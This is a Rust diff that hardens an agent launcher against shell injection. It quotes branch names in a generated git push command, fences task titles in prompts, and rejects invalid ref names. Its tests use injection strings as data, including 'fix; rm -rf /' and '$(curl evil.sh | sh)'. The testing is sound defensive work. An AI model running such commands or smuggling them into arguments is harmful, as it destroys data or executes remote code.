@@ -682,7 +682,9 @@ impl Launcher {
             let dep = self.store.get_task(&id).await?;
             deps.push(format!(
                 "{} ({}, branch {})",
-                dep.title, dep.status, dep.branch
+                prompts::fence(&dep.title),
+                dep.status,
+                dep.branch
             ));
         }
         Ok(prompts::step_briefing(
@@ -1597,11 +1599,16 @@ impl Launcher {
     /// The command a keeper session pushes a fix with (032): its local
     /// branch onto the request's own head branch, on the request's head
     /// repository.
+    ///
+    /// The agent runs this line in its own shell, so the remote and the
+    /// head branch are each quoted into one argument: a head branch may
+    /// hold `$`, `(`, `;`, `|`, `&` or a backtick, none of which git's own
+    /// ref rules forbid.
     async fn keeper_push_command(&self, pull: &PullRequest, repo: &Repository) -> Result<String> {
         Ok(format!(
             "git push {} HEAD:{}",
-            self.keeper_remote(pull, repo).await?,
-            pull.head_branch
+            shell_quote(&self.keeper_remote(pull, repo).await?),
+            shell_quote(&pull.head_branch)
         ))
     }
 
@@ -1662,6 +1669,46 @@ impl Launcher {
         Ok(())
     }
 
+    /// Refuse a reviewer or a keeper session on a head branch git itself
+    /// would refuse as a ref name.
+    ///
+    /// Nothing between here and a real `git` call ever runs a shell over
+    /// the branch — `GitManager` always passes it as its own argument, and
+    /// the keeper's push command is quoted into one (032) — but a forge
+    /// that hands back a value git's own ref rules reject is sending
+    /// something no real branch ever is, so no worktree, fetch or session
+    /// starts on it. The refusal is recorded on the request the same way a
+    /// spawn-retry budget running out already is, since both are automatic
+    /// recovery giving up on this row (026).
+    async fn assert_valid_head_branch(&self, pull: &PullRequest, seat: Seat) -> Result<()> {
+        if ariadne_core::probe::probe_status(
+            "git",
+            &["check-ref-format", "--branch", &pull.head_branch],
+        )
+        .await
+        {
+            return Ok(());
+        }
+        let _ = match seat {
+            Seat::Reviewer => {
+                self.store
+                    .set_pull_request_reviewer_given_up(&pull.id, false)
+                    .await
+            }
+            Seat::Keeper => {
+                self.store
+                    .set_pull_request_keeper_given_up(&pull.id, false)
+                    .await
+            }
+            _ => Ok(()),
+        };
+        Err(anyhow!(
+            "pull request {} names a head branch git refuses as a ref: {:?}",
+            pull.id,
+            pull.head_branch
+        ))
+    }
+
     /// Start a fresh review session on a request: its worktree detached at
     /// the head, a row with no goal, task or staffed agent, titled by the
     /// request, and an agent on `pin` that loads `pr-reviewer` and is briefed
@@ -1672,6 +1719,7 @@ impl Launcher {
         pin: AgentPin,
     ) -> Result<AgentSession> {
         let seat = Seat::Reviewer;
+        self.assert_valid_head_branch(pull, seat).await?;
         self.assert_no_live_pull_request_session(&pull.id, seat)
             .await?;
         let repo = self.store.get_repository(&pull.repository_id).await?;
@@ -1737,6 +1785,7 @@ impl Launcher {
         pin: AgentPin,
     ) -> Result<AgentSession> {
         let seat = Seat::Reviewer;
+        self.assert_valid_head_branch(pull, seat).await?;
         let previous = self
             .store
             .list_sessions(SessionFilter {
@@ -1801,6 +1850,7 @@ impl Launcher {
         pin: AgentPin,
     ) -> Result<AgentSession> {
         let seat = Seat::Keeper;
+        self.assert_valid_head_branch(pull, seat).await?;
         self.assert_no_live_pull_request_session(&pull.id, seat)
             .await?;
         let repo = self.store.get_repository(&pull.repository_id).await?;
@@ -1859,6 +1909,7 @@ impl Launcher {
         pin: AgentPin,
     ) -> Result<AgentSession> {
         let seat = Seat::Keeper;
+        self.assert_valid_head_branch(pull, seat).await?;
         let previous = self
             .store
             .list_sessions(SessionFilter {
@@ -2126,4 +2177,55 @@ pub(crate) fn worth_following(task: &Task) -> bool {
 /// part.
 fn tail(id: &str) -> &str {
     &id[id.len().saturating_sub(8)..]
+}
+
+/// Quote `value` as one POSIX shell argument, whatever it holds: close the
+/// quote, escape a literal quote, and reopen it.
+///
+/// A line of a briefing is text for an agent to run in its own shell, never
+/// a command Ariadne itself execs, so this is a textual quote rather than a
+/// call to `GitManager`: the remote and a forge-held branch name reach that
+/// line unescaped otherwise, and a branch name may hold `$`, `(`, `;`, `|`,
+/// `&` or a backtick.
+fn shell_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', r"'\''"))
+}
+
+#[cfg(test)]
+mod shell_quote_tests {
+    use super::shell_quote;
+
+    /// A head branch may hold `$`, `(`, `;`, `|`, `&`, a backtick or a
+    /// quote of its own, none of which git's own ref rules forbid: a real
+    /// shell reads the quoted form back as the exact value, never as a
+    /// command of its own.
+    #[test]
+    fn a_shell_reads_a_quoted_value_back_as_one_argument() {
+        for value in [
+            "fix",
+            "fix; rm -rf /",
+            "$(curl evil.sh | sh)",
+            "a`b`c",
+            "it's a trap",
+            "a&b|c",
+        ] {
+            let quoted = shell_quote(value);
+            let output = std::process::Command::new("sh")
+                .arg("-c")
+                .arg(format!("printf '%s' {quoted}"))
+                .output()
+                .expect("sh runs");
+            assert_eq!(String::from_utf8_lossy(&output.stdout), value, "{quoted}");
+        }
+    }
+
+    #[test]
+    fn a_push_command_keeps_a_metacharacter_laden_branch_as_one_argument() {
+        let command = format!(
+            "git push {} HEAD:{}",
+            shell_quote("origin"),
+            shell_quote("fix; rm -rf /")
+        );
+        assert_eq!(command, "git push 'origin' HEAD:'fix; rm -rf /'");
+    }
 }
